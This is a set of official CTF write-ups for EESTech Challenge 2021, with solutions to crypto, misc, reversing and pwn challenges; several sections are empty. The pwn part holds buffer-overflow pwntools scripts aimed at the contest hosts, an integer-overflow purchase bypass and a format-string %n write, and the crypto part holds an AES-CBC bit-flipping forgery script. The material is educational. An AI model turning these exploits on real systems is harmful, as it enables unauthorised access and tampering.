# EESTech Challenge 2021 Official Write-ups
We helped EESTech and Mesa to organize and manage the CTF, and here you can find all the writeups of the challenges.

Done by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Stefano Bagarin](https://github.com/stepolimi)

# Write Ups - Categories and Points
## Web
### Secret code
### Old website
### Note viewer
### Bad redirects

## Cryptography
### Once upon a time 1
Very trivial challenge. wcrx_{kl_hlfhlv_Silkvwfitzex_dv} is clearly "encoded" with Caesar algorithm, so just decrypt it in some way.
**flag_{tu_quoque_Bruteforcing_me}**

### Once upon a time 2
Again another trivial challenge, the main issue was to get the used algorithm. An easy answer is Vigenerè, which is easily bruteforceable, but some online tools would mess this up. A huge hint was given in the challenge description, saying "remember that in cryptography patience is key".

With no surprise, decrypting with key = PATIENCE gives the flag: **flag_{this_was_too_easy_to_decrypt!}**

### Hashception
The challenge starts with a file containing bunch of alphanumerical strings, and 4 strings that were the first 4 strings in the file; the challenge name also states "Blake" which could refer to an hashing algorithm, interesting.

The strings length is repeated in a cyclic way, so:
* 1st string: 128 chars
* 2nd string: 40 chars
* 3rd string: 64 chars
* 4th string: 64 chars
* and then repeated  

We can try to bruteforce one of the first 4 strings (*da39a3ee5e6b4b0d3255bfef95601890afd80709*), resulting in an empty string hashed with SHA1. Ok so maybe also the other 3 correspond to an empty string? 
The answer is yes, and by simply trying I we can pull out also the other used algorithms, reaching this situation:
* 1st string: Blake 2b Hash
* 2nd string: SHA1
* 3rd string: SHA256
* 4th string: SHA3-256

From now on it's pretty easy: we know the algorithms and that we have to always add only a new character.

Here is the final script, that simply gets all the strings and starts from the 5th one. In a cyclic way it bruteforces char by char the 4 different hash types until the end: 
```python
import hashlib
alphabet = " 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ,.-_'?!$%&/()={}"
message = ""

file1 = open('hash.txt', 'r')
Lines = file1.readlines()

count = 0;

for line in Lines:
	if(count >3):
		for c in alphabet:
			encMes = ""
			if(count % 4 == 0):
				encMes = hashlib.blake2b(str.encode(message +c)).hexdigest()
			elif(count % 4 == 1):
				encMes = hashlib.sha1(str.encode(message +c)).hexdigest()
			elif(count % 4 == 2):
				encMes = hashlib.sha256(str.encode(message +c)).hexdigest()
			elif(count % 4 == 3):
				encMes = hashlib.sha3_256(str.encode(message +c)).hexdigest()
			if(encMes in line):
				message += c
				break
	count +=1

print(message)
```
Flag: 

**flag_{1t3r4t1v3_h4sh_cr4ck1ng_1s_qu1t3_c00l_w1th_pyth0n}**

### Not a noob
The important thing of this challenge was to have an idea of RC4 algorithm. RC4 is basically a XORing algorithm, and the only way to get the flag here was to suppose that the keys used were identical (as they were): this could be extracted by the fact that we told you "there is no need to bruteforce the key".

Given this, the remaining part is to XOR the two images without XORing their headers. A bitwise XOR on images is performed with this fancy command (Unix systems):
```
convert noob_1.png noob_2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" noob_out.png
```
Resulting in noob_out.png containing: **D0n7_reU2e_J00R_Key2**

### Bank fraud
This wasn't a trivial challenge, however the things you had to focus on were:
* the plaintext length
* the block size

What we have is the original ptx (SEND BOB 100$, length = 13) and its ctx (4c60fc0a8fdf3baa185c885195be64b5 2462320459dbd69ea4383c139c19999e, size1 = 16, size2 = 16). Every AES block in CBC is thus of 16 byte size. 

The modified ptx should become (SEND LEO 999999$, length = 16), so we are good, staying in a single block.

Briefly, AES-CBC works on fixed-size blocks (we said 16 bytes), and during *encryption* the ciphertext of the previous block is used to generate the next one, starting from an Initialization Vector IV (we can say IV = CTX_0). Knowing that, we can conclude that the given ctx is formed by IV and CTX_1 (remember, we use only 1 block).

During *decryption*, the CTX_N-1 is used to generate the plaintext of the next block; this is where the **bit/byte flipping attack** smashes. If we change one byte of the CTX_N-1 then, by XORing with the next decrypted block, we will get a different plaintext!

In this case we control the CTX_1, thus we have to modify the previous block: IV!

In the following picture you can see the decryption process of AES-CBC, so considering only the first block, the CTX will be first decrypted (with an unknown key) and then XORed with the IV. We provide both the IV and the CTX, so we are in total control of this.

![Alt text](./Cattura.PNG?raw=true "Title")


Let's get a general idea: 

```
PTX1 = SEND BOB 100$ 		= 	53 45 4e 44 20 42 4f 42 20 31 30 30 24 00 00 00
PTX2 = SEND LEO 999999$ 	=	53 45 4e 44 20 4c 45 4f 20 39 39 39 39 39 39 24
IV_original			=	4c 60 fc 0a 8f df 3b aa 18 5c 88 51 95 be 64 b5 
CTX_1 				= 	24 62 32 04 59 db d6 9e a4 38 3c 13 9c 19 99 9e

In formulas we get:
dec(CTX) ^ IV_original = PTX

Take the 6th byte as an example (corresponding to the PTX character 'B'):
dec(db) ^ df = 42

So:
42 ^ df = dec(db) = 9d

We now ask ourselves, what is the number that, XORed with 9d, gives us 4c (the new char that we want, so 'L')?
x ^ 9d = 4c	=>	4c ^ 9d = d1
```

**d1** is in fact the 6th byte of the new IV to provide as a flag. 
Let's put it as a general formula: 
```
IV_modified[i] = PTX2[i] ^ (IV_original[i] ^ PTX1[i])
```

This can be written in Python, here you can find two different scripts:

```python
-------------
| SCRIPT 1  | (inputs are different)
-------------

iv = [0x49,0x86,0xc2,0x88,0x7a,0x1d,0xfd,0xed,0xea,0xfd,0xab,0x18,0x93,0x8c,0x00,0x19]
ctx = '4c691cb28b4d399bea66f6fa9caae243'

ptx1 = [0x53,0x45,0x4e,0x44,0x20,0x42,0x4f,0x42,0x20,0x31,0x30,0x30,0x24,0x00,0x00,0x00]
ptx2 = [0x53,0x45,0x4e,0x44,0x20,0x4c,0x45,0x4f,0x20,0x39,0x39,0x39,0x39,0x39,0x39,0x24]

res=''
for i in range(0,5):
    res += hex(iv[i])[-2:]

for i in range(5,len(iv)):
    res += (hex(ptx2[i] ^ (iv[i] ^ ptx1[i]))[-2:])
    
print(res + ' ' + ctx)

-------------
| SCRIPT 2  |
-------------

def stringToHexNum(n):
    return int(n, 16)
    
iv2 = '4c60fc0a8fdf3baa185c885195be64b5'
ctx = '2462320459dbd69ea4383c139c19999e'
iv = []
ptx1 = []
ptx2 = []

a = 'SEND BOB 100$'
b = 'SEND LEO 999999$'

for i in range(0,len(iv2),2):
    iv.append(iv2[i] + iv2[i+1])

for i in range(0,len(a)):
    ptx1.append(format(ord(a[i]), "x"))

for i in range(len(a),16):
    ptx1.append('00')

for i in range(0,len(b)):
    ptx2.append(format(ord(b[i]), "x"))

res=''
for i in range(0,5):
    res += iv[i]

for i in range(5,len(iv)):
    x = stringToHexNum(ptx2[i])
    y = stringToHexNum(iv[i])
    z = stringToHexNum(ptx1[i])
    res += hex(x ^ (y ^ z))[-2:]
    
print(res + ' ' + ctx)

```
## Forensics
### Succulent
### Little riddle
### Little haystack
```python

```
### Big haystack
```python

```
### Blackhole
### German espionage

## Miscellaneous
### Trust me
Very easy challenge, what we have to do is to recognize the "encryption" used, that in this case is clearly Base64 (easy to guess from the = at the end). A little hint was already there, because I know a lot of people who think that B64 is an encryption method, just because it's something different from text.

We can easily decode all the strings and get: 
```
MzY0XzRuXw== -> 364_4n_  
M25jcnlwdDEw -> 3ncrypt10
bj9fbjQ0NDQ= -> n?_n4444
NDQ0NGh9 -> 4444h}
ZmxhZ197 -> flag_{
MXNfYjRz -> 1s_b4s
```

A quick reordering and we get the flag: **flag_{1s_b4s364_4n_3ncrypt10n?_n44444444h}**

### Papernote
This challenge was quite tricky honestly. The description says: *I have an EXCLUSIVE news 4 you: this is NOT the flag!*

What we have to do is to basically try to understand this: we get EXCLUSIVE, 4 and NOT as key words to remember. With some immagination we can suppose to take the input and apply two operations: a XOR and a NOT. A XOR, for who doesn't know, is an EXCLUSIVE OR operation, so this makes sense. At the same time, we must find a number to make the XOR with: 4 seems perfect!

Now we can start trying (operations order won't be a problem, we can XOR and then NOT or viceversa), the only thing we have to be careful is that they will be bitwise operations. We can perform them with online tools or with a very simple Python script, as shon below:

```python
def stringToHexNum(n):
    return int(n, 16)
    
input = '9d979a9ca480caa497ca90c8a497cb9cca98a4cb8bc8cf8fcacb958886'

iv = []
res = ''

# split the input byte by byte
for i in range(0,len(input),2):
    iv.append(input[i] + input[i+1])

# for each byte perform a XOR with 4 and a NOT
for i in range(0,len(iv)):
    x = stringToHexNum(iv[i])
    res += chr(stringToHexNum(hex(~(x ^ 4) & 0xff)[2:]))
    
print(res)
```

The flag is: **flag_{1_l1k3_l0g1c_0p34t10ns}**

### Throwback
The main issue with this challenge is that the given string highly reminds base4 numbers, but that was the point. We also released an hint about that, so you could get the real language used (Morse code). Morse code is actually a quaternary code, with 4 main characters: 
* Line
* Point
* Space
* Newline

So now the challenge is how to replace numbers (0, 1, 2, 3) with these new chars? Well, trial and error is always a good way (helped by the fact that Line and Point should be the ones more frequent, so 1 and 0).

```python
encoded = "0000202010020100211123212000020020002320020002320123211200200021010202010020100201210202111200120002320210012012112011020100202010101232120000202320010201002012110232002000232011212111002110200012001021102000002110120002001021012101020121201021100112321011211120012320000201200012023212111232002102000202010212321200002023210102001201020100210112321000201020121010202000232012102100232120000202320012102100202010200021010211120102023210102000020120102012101021202010232101121112001201020002020100200102010101"
decoded = encoded.replace("0", ".")
decoded = decoded.replace("1", "-")
decoded = decoded.replace("2", " ")
decoded = decoded.replace("3", "\n")

print(decoded)
```
Resulting in:
```
 .... . .-.. .-.. --- 
 - .... .. ... 
 .. ... 
 .- 
 -- .. ... -.-. . .-.. .-.. .- -. . --- ..- ... 
 . -..- .- -- .--. .-.. . .-.-.- 
 - .... . 
 ..-. .-.. .- --. 
 .. ... 
 .-- - ---.. --. ...- ..-. --. ..... --.- ... ..-. -.- -.-. .- - .-. --..-- 
 -.-- --- ..- 
 .... .- ...- . 
 - --- 
 .. -. ... . .-. - 
 - .... . 
 -.-. ..- .-. .-.. -.-- 
 -... .-. .- -.-. . ... 
 .- -. -.. 
 - .... . 
 ..- -. -.. . .-. ... -.-. --- .-. . 
 -.-. .... .- .-. .- -.-. - . .-. 
 -.-- --- ..- .-. ... . .-.. ..-. .-.-.-
```
This is clearly Morse code, so let's just convert it into text (a lot of online tools are available), resulting in:

```hello?this?is?a?miscellaneous?example??the?flag?is?wt8gvfg5qsfkcatr??you?have?to?insert?the?curly?braces?and?the?underscore?character?yourself?```

Ok, so the flag is **flag_{wt8gvfg5qsfkcatr}**

### EESTudios
We are given 2 audio tracks, one "Studio" version and one "Official" version: this already was an hint, due to the fact that having 2 tracks and knowning there is a watermark (or a sort of copyright) we can conclude that we should do some operations between them. To solve it we can open the two tracks with ```Audacity``` to see if just the spectrum of the leaked track contains, for example, an image with the flag (common thing with audio steganography challenges). 

This was right, but we just wanted to fool you ("Nice try! This is not the flag" is displayed). A watermarked audio theoretically contains more than the non-watermarked one, so invert the second one (```Effects > Invert > Built-in-Effect: Invert```) and mix them (```Tracks > Mix > Mix and Render```): the result is, as expected, the actual watermark. By listening it, this is the spelling of the flag.

Here is the flag: 

**flag_{you_did_it}**

## Reversing
### Homemade Encryption
The given code is:
```python
import binascii
key = "graAhogG"
def mystery(s):
    r = ""
    for i, c in enumerate(s):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return binascii.hexlify(bytes(r, "utf-8"))
```
Seems cool right? Well yes, but actually no. 
What happens with every pure XORing encrypting algorithm? That if the key is known, we can just apply again the encription to decrypt the cyphertext! 
In this case we know the key (graAhogG), so given the ctx as input we can trivially invert everything like this:

```python
import binascii
key = "graAhogG"
flag= "661ec2a3c2a4c3bf5009c2995970c295c2a9c299c3bcc3814111c3a0c28dc2ab4f69c2a7"
def mystery(s):
    r = ""
    t = binascii.unhexlify(s).decode("utf-8")
    for i, c in enumerate(t):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return bytes(r, "utf-8")

print(mystery(flag))
```

### Password Here Please
The challenge consinsted in reverse engineering a ```Python``` code to find the string that gets throught each check. The first step was just understanding that the problem could be divided in 4 parts.

The first part (lines 5-7) was just a check on the lenght of the string that must be 24 characters. 

The second part (lines 9-14) was a constrain con the first 8 characters of the string: theyr hexadecimal ASCII value being subtracted to 0x98 and concatenated togheter had to be equal to the string '&e"3&Ew*'.
	Resulting string = "r3verS!n"

The third part (lines 16-23) was checking the second set of 8 characters of the string. The last one's ASCII value added to the last character of the array "ring" and to 0x1f gave the last character of the string; each other one was it's following character's ASCII value plus the corresponding number in the "ring" array plus 0x1f if grather than 0x60-0x1e, minus 0x1f if between 0x40-0x1e and 0x60-0x1d, unchanged otherwise.
	Resulting string = "g_pyTh0n"

The fourth part (lines 25-31) was for the last 8 characters and it was the most challenging one. I tryed to convert "code" from hexadecimal to decimal value and then put it in base 257, the result was a nice "number":

[8, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

after noticing that each number is a power of 2 I managed to realize that the distance from each non-zero number to the start of the number added to 0x28 was the ASCII value of the characters of the substring, while the exponent of 2 was the index of the character in the substring (0-7).
Once understood that, there was only left to find each value and reorder them.
	Resulting string= "_fOr_FUn"

The result was the 3 substrings togheter.

**r3verS!ng_pyTh0n_fOr_FUn**

### Emotet is between us

## Pwn
### Binary1.0
This challenge is very trivial. Our goal is to bypass the if statement and execute the system function. to bypass the boolean controll we must modify the "isAuthenicated" variable from 0 to any other value, in simple terms we must overflow the buffer (48 bytes) with a payload of 48+8 bytes long; in this way we overwrite the content of "isAuthenticated" variable and wether the last eight bytes of the payload are different from zero we have bypassed the if statement and we get the flag.

Written in Python this is:
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5150)

payload = b"a" * 62

r.send(payload)

r.interactive()
```

**MetaCTF{just_a_little_auth_bypass}**

### Binary2.0
This challenge is quite similar to the previus one. We always have to do a buffer owerflow in this way: to bypass the string comparison our buffer must start with "Sup3rs3cr3tC0de" string and it must overwrite RIP with the address of the win function. The below script is auto-esplicative.
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5151)

# from a quick run with gdb
addr = 0x401172 
base = 0xd68
payload = b"Sup3rs3cr3tC0de" + b"\x00" * 33 + p64(base) + p64(addr)

r.send(payload)

r.interactive()
```

**MetaCTF{c_strings_are_the_best_strings}**

### Godlike
One of the hardest challenges, I'm not gonna lie. Given the fact that here there is one intended solution and an unintended one, we will focus mainly on the first one.
Let's play with the binary: what we can immediately get is that earning "legit" money won't be feasible, so we must search for a better approach. I will divide the exploitation in two main phases.

> Getting the shoutout

**Unintended:** by betting A LOT, always all of your money, you will eventually succeed to get enough money to legally buy the shoutout. However this was not the best way to solve that part, also because you may fight against probability.

**Intended:** by looking at the source code, we can notice something interesting in the purchase() function:
```c
void purchase()      
{        
    std::map<std::string, unsigned long long> prices{
        {"tool", 100},                                                                                  
        {"encouragement", 20},
        {"shout-out-from-literally-god", 1000000000000000ULL}};
                                                    
    std::string option{};                                                                               
    do {
        std::cout << "What would you like to buy? Options are ";
        for (auto& entry : prices) {
            std::cout << entry.first << " (cost: " << entry.second << "), ";
        }
        std::cout << "or cancel" << std::endl;
        std::cin >> option;
        if (option == "cancel") {
            return;
        }
    } while (prices.find(option) == prices.end());

    unsigned long long count{0};
    do {
        std::cout << "How many would you like to buy? Must be greater than 0 (count, player_funds)" << std::endl;
        std::cin >> count;
    } while (!std::cin.good() || !count);

    auto item_cost{prices.at(option)};
    auto total{item_cost * count};

    if (total > player_funds) {
        std::cout << "You don't have the money for that!" << std::endl;
        return;
    }
...
```

When purchasing, an `auto total{item_cost * count};` variable will be calculated (auto means that the variable type will be assigned automatically). What's the problem here? An **integer overflow** is possible (remember that overflows are not only on buffers) meaning that we should try to get a precise number that leads to a `total` variable equal to 0, 0 because it's always a good price.

Let's split a bit the problem to understand it better: 
* We are in control of the `count` variable, and only of that (it's an `unsigned long long`)
* The maximum number that can be stored in an `unsigned ll` is 2^64, so 18,446,744,073,709,551,616, call it `max_ull`
* An integer overflow happens when we try to store a bigger number, so we want to do this
* When overflowing, the number will be divided by `max_ull` (integer division, modulo) and stored

Now that this is clear, write some math to get the desired value `x`, given the `shoutout_cost`:
```
x * shoutout_cost = 0 (mod max_ull)
so:
x * 1000000000000000 = 0 (mod 18446744073709551616)
x = 562949953421312 * c, where c is a constant
```

Easy, now we will just send 562949953421312 as quantity for the shoutout and God will talk to us, but it's not over yet!

> Retrieving the flag

Unfortunately God seems not to be really happy, so let's have a deeper look to the code:
```c
...
 else if (option == "shout-out-from-literally-god") {
        bool god_is_happy = rand() & 0xFFFFFF == 0;
        bool* god_is_really_happy = &god_is_happy;
        printf("Hmmmm\n");
        printf(name.c_str());
        printf("\nYou have done well!\n");
        printf("Good job!\n");

        if (*god_is_really_happy) {
            printf("I'm feeling generous right now!\nHave a flag!\n");
            std::ifstream t("flag.txt");
            std::string str((std::istreambuf_iterator<char>(t)),
                            std::istreambuf_iterator<char>());
            std::cout << str << std::endl;
        }
...
```
ALWAYS look carefully at every possible vulnerability, here we have one of the most common: **Format String**.

When the program starts we are asked for a name. Nice, but what happens is that this name is then printed just before the shoutout with a printf... 

Input is never sanitized or modified, so this looks quite promising: just try with a %x as name, you will see some leaks when getting the shoutout. The issue is now how to make God really happy, and the solution is the "classing" writing with a Format String. Using %n will write the number of characters written so far. Basically, it means that %n will write the size of our input at the address pointed by %n.

After some local debugging with gdb looking at the stack and variables locations, we discover that `god_is_really_happy` variable is the 12th pointer to be printed. We did it!

We just need to print 12 pointers with %p%p%p%p%p%p%p%p%p%p%p%p as name and see if everything is working as intended. The last missing part is to craft the actual name, so we want to put "something" different from 0 to the 12th pointer.

Let's try with AAAA%12$n, meaning: *write the length of 'AAAA' (4) as 12th parameter*, this works and we will leak the flag.

Curiously enough, this challenge was solvable directly from the terminal by copy-pasting those 2 needed inputs, but here we write a more elegant way with a Python script: 
```python
```
**MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}**
